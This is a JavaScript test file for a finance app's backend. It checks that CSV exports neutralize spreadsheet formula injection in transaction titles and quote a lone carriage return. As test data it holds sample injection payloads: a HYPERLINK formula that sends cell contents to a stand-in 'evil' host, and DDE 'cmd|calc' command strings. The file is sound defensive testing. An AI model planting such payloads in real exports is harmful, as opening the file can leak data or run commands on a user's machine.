import { describe, it, expect } from 'vitest'
import request from 'supertest'
import app from '../app'
import { authHeader, registerUser } from './helpers'
import { escapeCsvValue, buildCsvString } from '../utils/transactionUtils'

/**
 * G2 acceptance spec (TODO.md T2 -> C4, SEC-17, BUG-11).
 *
 * `backend/utils/transactionUtils.ts:397-402`'s `escapeCsvValue` handles RFC 4180 quoting
 * correctly (`"`, `,`, `\n`) but does nothing about formula injection: a transaction titled
 * `=HYPERLINK("http://evil/"&A1,"Click")` is written to the CSV verbatim, and Excel/LibreOffice/
 * Sheets execute it on open. It also misses a lone `\r` in its quoting character class
 * (`BUG-11`) — `/[",\n]/` does not match `"a\rb"`.
 *
 * `buildCsvString` (:404-406) is the single choke point both CSV export paths share:
 * `utils/exportUtils.ts`'s `transactionsToCsv` (transaction download) and
 * `utils/reportUtils.ts`'s `customReportToCsv` (custom report export) both call it, so a fix
 * inside `escapeCsvValue` itself covers both without touching either caller.
 *
 * Contract assumed for the fix: any value beginning with `=`, `+`, `-`, `@`, a tab, or a CR is
 * neutralized (prefixed so spreadsheet software no longer treats it as a formula — e.g. a
 * leading single quote, or wrapping in quotes with a neutralizing prefix inside), and `\r` joins
 * `"`/`,`/`\n` in the existing quoting character class. The exact neutralization character is
 * left unpinned here (asserted only as "no longer starts with the raw dangerous prefix") so the
 * test doesn't overfit a specific implementation choice.
 */

const DANGEROUS_PREFIXES = ['=', '+', '-', '@', '\t', '\r']

describe('CSV formula-injection neutralization (C4, SEC-17)', () => {
    describe('escapeCsvValue', () => {
        it.each(DANGEROUS_PREFIXES)(
            'neutralizes a value beginning with %j so it no longer starts with the raw character',
            (prefix) => {
                // Deliberately free of `"`, `,`, `\n` so this isolates the new prefix-based
                // neutralization from the pre-existing RFC 4180 quoting rule.
                const malicious = `${prefix}cmd|calc!A0`
                const escaped = escapeCsvValue(malicious)
                const contentAfterQuoting = escaped.startsWith('"')
                    ? escaped.slice(1, -1).replace(/""/g, '"')
                    : escaped

                expect(contentAfterQuoting.startsWith(prefix)).toBe(false)
            }
        )

        it('leaves an ordinary value with no dangerous prefix unchanged', () => {
            expect(escapeCsvValue('Groceries')).toBe('Groceries')
        })

        it('still quotes values containing a comma, quote, or newline (regression)', () => {
            expect(escapeCsvValue('a,b')).toBe('"a,b"')
            expect(escapeCsvValue('a"b')).toBe('"a""b"')
            expect(escapeCsvValue('a\nb')).toBe('"a\nb"')
        })

        it('quotes a value containing a lone CR (BUG-11)', () => {
            const escaped = escapeCsvValue('a\rb')
            expect(escaped.startsWith('"')).toBe(true)
            expect(escaped.endsWith('"')).toBe(true)
        })

        it('does not neutralize a value with a dangerous character in the middle', () => {
            expect(escapeCsvValue('Rent=Utilities')).toBe('Rent=Utilities')
        })
    })

    describe('buildCsvString', () => {
        it('neutralizes formula-leading values across a full row', () => {
            const csv = buildCsvString([
                ['Title', 'Amount'],
                ['=cmd|"/c calc"!A0', '42.00'],
            ])
            const dataLine = csv.split('\n')[1]
            const titleField = dataLine.split(',')[0]
            expect(titleField.replace(/^"|"$/g, '').startsWith('=')).toBe(false)
        })
    })

    describe('transaction CSV export (transactionsToCsv path)', () => {
        async function createTestAccount(token: string) {
            const res = await request(app)
                .post('/api/v1/accounts')
                .set(authHeader(token))
                .send({ name: 'Checking', type: 'checking', openingBalance: 1000 })
            return res.body.data
        }

        async function getFoodMasterId(token: string): Promise<string> {
            const res = await request(app).get('/api/v1/categories').set(authHeader(token))
            const food = res.body.data.masters.find((m: { name: string }) => m.name === 'Food')
            if (!food) throw new Error('Food master category not found')
            return food._id
        }

        it('neutralizes a formula-injection payload in a transaction title on download', async () => {
            const { token } = await registerUser(app)
            const account = await createTestAccount(token)
            const categoryId = await getFoodMasterId(token)

            await request(app)
                .post('/api/v1/transactions')
                .set(authHeader(token))
                .send({
                    type: 'expense',
                    title: '=HYPERLINK("http://evil/","Click")',
                    amount: 25,
                    date: '2026-01-15T12:00:00.000Z',
                    accountId: account._id,
                    categoryId,
                })

            const res = await request(app).get('/api/v1/transactions/download').set(authHeader(token))

            expect(res.status).toBe(200)
            expect(res.text).not.toMatch(/(?:^|,|")=HYPERLINK/m)
        })
    })

    describe('custom report CSV export (customReportToCsv path shares escapeCsvValue)', () => {
        async function createTestAccount(token: string) {
            const res = await request(app)
                .post('/api/v1/accounts')
                .set(authHeader(token))
                .send({ name: 'Checking', type: 'checking', openingBalance: 1000 })
            return res.body.data
        }

        async function getFoodMasterId(token: string): Promise<string> {
            const res = await request(app).get('/api/v1/categories').set(authHeader(token))
            const food = res.body.data.masters.find((m: { name: string }) => m.name === 'Food')
            if (!food) throw new Error('Food master category not found')
            return food._id
        }

        it('neutralizes a formula-injection payload surfaced via the largest-expenses metric', async () => {
            const { token } = await registerUser(app)
            const account = await createTestAccount(token)
            const categoryId = await getFoodMasterId(token)

            await request(app)
                .post('/api/v1/transactions')
                .set(authHeader(token))
                .send({
                    type: 'expense',
                    title: '=cmd|\'/c calc\'!A0',
                    amount: 500,
                    date: '2026-01-15T12:00:00.000Z',
                    accountId: account._id,
                    categoryId,
                })

            const res = await request(app)
                .post('/api/v1/dashboard/reports/generate')
                .set(authHeader(token))
                .send({
                    periodType: 'monthly',
                    year: 2026,
                    month: 1,
                    metrics: ['largestExpenses'],
                    format: 'csv',
                })

            expect(res.status).toBe(200)
            expect(res.text).not.toMatch(/(?:^|,|")=cmd/m)
        })
    })
})
